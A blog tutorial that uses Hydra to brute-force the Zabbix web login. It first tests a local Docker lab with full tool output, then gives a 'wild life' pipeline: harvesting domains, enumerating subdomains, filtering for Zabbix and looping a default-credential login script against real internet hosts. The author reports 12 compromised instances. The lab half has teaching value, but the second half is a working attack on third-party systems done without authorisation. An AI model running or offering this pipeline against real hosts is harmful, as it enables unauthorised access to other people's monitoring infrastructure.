---
title: "Taking over Zabbix with Hydra"
description: "The post describes a procedure of breaking into zabbix machines with Hydra. The technique uses brute force and not very effective, however can be utilized for weakly maintianed infrastrcuture."
date: 2024-05-22T01:58:40.873Z
draft: false
tags: [zabbix, hydra, nuclei, bruteforce]
categories: [computers]
thumbnail: "/article/taking-over-zabbix-with-hydra/thumb.webp"
---

## Lab experiment

As usual, we start with an experiment in highly constrolled conditions - in our virtual lab. 

Let's first install hydra:

```bash
sudo apt install hydra -y
```

Then let's run [zabbix appliance](https://hub.docker.com/r/zabbix/zabbix-appliance/) to have all zabbix components run in a single command:

```bash
docker run --name some-zabbix-appliance -p 80:80 -p 10051:10051 -d zabbix/zabbix-appliance:tag
```

After docker ran, we can see exposed ports:

```bash
docker ps
CONTAINER ID   IMAGE                     COMMAND                  CREATED             STATUS             PORTS                                                                                       NAMES
3b0230770aa0   zabbix/zabbix-appliance   "/sbin/tini -- /usr/…"   About an hour ago   Up About an hour   0.0.0.0:80->80/tcp, :::80->80/tcp, 0.0.0.0:10051->10051/tcp, :::10051->10051/tcp, 443/tcp   some-zabbix-appliance
```

and we get into the UI by going with browser to `http://localhost`:

![ui](/article/taking-over-zabbix-with-hydra/ui.png)

Let's login with default credentials, `Admin:zabbix`:

![ui](/article/taking-over-zabbix-with-hydra/insidezabbix.png)

Now, time to test `hudra`:

```bash
hydra -l Admin -p zabbix 127.0.0.1 http-post-form "/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:Login name or password is incorrect" -V
```

with the following results:

```bash
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-23 13:21:43
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking http-post-form://127.0.0.1:80/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:Login name or password is incorrect
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "zabbix" - 1 of 1 [child 0] (0/0)
[80][http-post-form] host: 127.0.0.1   login: Admin   password: zabbix
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-23 13:21:44
```

What if used invalid password, e.g. `zabbix1`?

```bash
hydra -l Admin -p zabbix1 127.0.0.1 http-post-form "/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:Login name or password is incorrect" -V
```

prints

```bash
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-23 13:23:30
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking http-post-form://127.0.0.1:80/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:Login name or password is incorrect
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "zabbix1" - 1 of 1 [child 0] (0/0)
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-23 13:23:30
```


We'll use [SecLists](https://github.com/danielmiessler/SecLists.git) for password lists:

```bash
git clone https://github.com/danielmiessler/SecLists.git
```

Let's run `hydra` with `SecLists/Passwords/Common-Credentials/10k-most-common.txt`:

```bash
hydra -l Admin -P ../SecLists/Passwords/Common-Credentials/10k-most-common.txt 127.0.0.1 http-post-form "/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:Login name or password is incorrect" -V
```

Wow, we got an interesting result:

```bash
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-23 13:36:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-post-form://127.0.0.1:80/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:Login name or password is incorrect
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "password" - 1 of 10000 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "123456" - 2 of 10000 [child 1] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "12345678" - 3 of 10000 [child 2] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "1234" - 4 of 10000 [child 3] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "qwerty" - 5 of 10000 [child 4] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "12345" - 6 of 10000 [child 5] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "dragon" - 7 of 10000 [child 6] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "pussy" - 8 of 10000 [child 7] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "baseball" - 9 of 10000 [child 8] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "football" - 10 of 10000 [child 9] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "letmein" - 11 of 10000 [child 10] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "monkey" - 12 of 10000 [child 11] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "696969" - 13 of 10000 [child 12] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "abc123" - 14 of 10000 [child 13] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "mustang" - 15 of 10000 [child 14] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "michael" - 16 of 10000 [child 15] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "shadow" - 17 of 10000 [child 4] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "master" - 18 of 10000 [child 7] (0/0)
[ATTEMPT] target 127.0.0.1 - login "Admin" - pass "jennifer" - 19 of 10000 [child 6] (0/0)
[80][http-post-form] host: 127.0.0.1   login: Admin   password: 123456
[80][http-post-form] host: 127.0.0.1   login: Admin   password: michael
[80][http-post-form] host: 127.0.0.1   login: Admin   password: mustang
[80][http-post-form] host: 127.0.0.1   login: Admin   password: 12345678
[80][http-post-form] host: 127.0.0.1   login: Admin   password: abc123
[80][http-post-form] host: 127.0.0.1   login: Admin   password: 12345
[80][http-post-form] host: 127.0.0.1   login: Admin   password: baseball
[80][http-post-form] host: 127.0.0.1   login: Admin   password: password
[80][http-post-form] host: 127.0.0.1   login: Admin   password: monkey
[80][http-post-form] host: 127.0.0.1   login: Admin   password: 1234
[80][http-post-form] host: 127.0.0.1   login: Admin   password: letmein
[80][http-post-form] host: 127.0.0.1   login: Admin   password: football
[80][http-post-form] host: 127.0.0.1   login: Admin   password: 696969
[80][http-post-form] host: 127.0.0.1   login: Admin   password: shadow
[80][http-post-form] host: 127.0.0.1   login: Admin   password: master
[80][http-post-form] host: 127.0.0.1   login: Admin   password: jennifer
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-23 13:36:41
```

We got many matching passwords from Hydra, e.g. `123456`, `michael`, etc. Probably Zabbix hide something regarding their default password. Let's go to the UI and check `Admin:123456`:

![Account is blocked](/article/taking-over-zabbix-with-hydra/blocked.png)

Ok, now it's clear. Zabbix blocked `Admin` after 19 insuccessful attempts and `hydra` did not uderstand its answer correctly because it did not find in the response `Login name or password is incorrect`: all `Account is blocked for 30 seconds` were interpreted as success.

Well, we have discovered Zabbix has an anti-bruteforce policy implemented and that makes our life hard. Therefore, we turn to a very simple and basic case of scanning of wild life zabbixes: we'll try only default zabbix creds in hope the admin forgot to change them. We should also remember that `hydra` will report false positives for any errors which differ from `Login name or password is incorrect`.

## Wild life

We want to identify zabbix services by domain names. Let's first get domains from [Kaeferjaegger.gay](https://kaeferjaeger.gay/?dir=sni-ip-ranges) and grep domains out:

```bash
grep -E -o '[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+(\.[a-zA-Z]{2,})' ~/sni_ip_ranges/phatboi.txt > domains.txt
```

Then with [subfinder](https://github.com/projectdiscovery/subfinder) let's find the subdomains:

```bash
subfinder -dL domains.txt -silent -o subdomains.txt
```

and unite both domains and subdomains:

```bash
cat domains.txt subdomains.txt | sort | uniq > alldomains.txt
```

Let's find zabbix-related ones:

```bash
grep 'zabbix' alldomains.txt > domains.zabbix
```

Now, create a small hydra runner:

```bash
#!/bin/bash
# test.sh
domain=$1
hydra -l Admin -p zabbix $domain http-post-form "/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:Login name or password is incorrect" -V
```

And finally run the test:

```bash
chmod +x test.sh
while read -r line
do
	test.sh $line
done  < domains.zabbix
```

In our test we were able to find 12 zabbix instances with default credentials. Not bad at all!

Happy hunting.